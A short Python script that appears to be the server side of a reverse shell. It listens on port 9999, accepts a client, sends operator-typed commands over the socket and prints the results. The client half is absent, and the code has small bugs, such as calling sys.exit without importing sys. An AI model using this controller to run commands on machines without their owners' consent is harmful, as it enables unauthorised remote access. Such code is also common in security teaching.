import socket

'''creating socket to establish the connection'''
def createSocket():

    '''to handle the error while connection'''
    try:
        global host
        global port
        global s
        host=""
        port=9999
        
        '''craeting socket obejct'''
        s=socket.socket()
        h_name = socket.gethostname()
        IP_addres = socket.gethostbyname(h_name)
        print(IP_addres)
    except socket.error as msg:
        print("Socket creation error is :"+str(msg))

'''binding the sockt and listening for connections'''        
def bindSocket():
    try:
        
        '''to acces the values which are used in createSocket() method'''
        global host
        global port
        global s
        print("Binding to Port"+str(port))
        s.bind((host,port))
        
        '''if the client is requesting to make the connection'''
        s.listen(5)
        
    except socket.error as msg:
        print("Socket Binding error is :"+str(msg)+"\n" +"Retrying...")
        
        '''it will call itslef recursuvely till the connection is estblished'''
        bindSocket()

'''Establishing connection with a client (socket must be listening'''
def socketAccept():
    '''con is the object of the client and address is list that contains ip snd port'''
    con,address=s.accept()
    print("Connection has been been established..."+"\n"+"IP="+address[0]+"\n"+"IP="+str(address[1]))
    '''sending command to the client'''
    sendCommand(con)
    con.close()
    
'''sending command to the client'''
def sendCommand(con):
    while True:
        cmd=input("enter command")
        if cmd=="quit":
            con.close()
            s.close()
            sys.exit()
        '''the msg is sended in the form of bytes'''
        if len(str.encode(cmd))>0:
            con.send(str.encode(cmd))
            
            '''to decode the output from client'''
            client_response=str(con.recv(20480),"utf-8")
            '''end ="" to make the cursor in new line for next command'''
            print(client_response,end="")
def main():
    createSocket()
    bindSocket()
    socketAccept()

main()
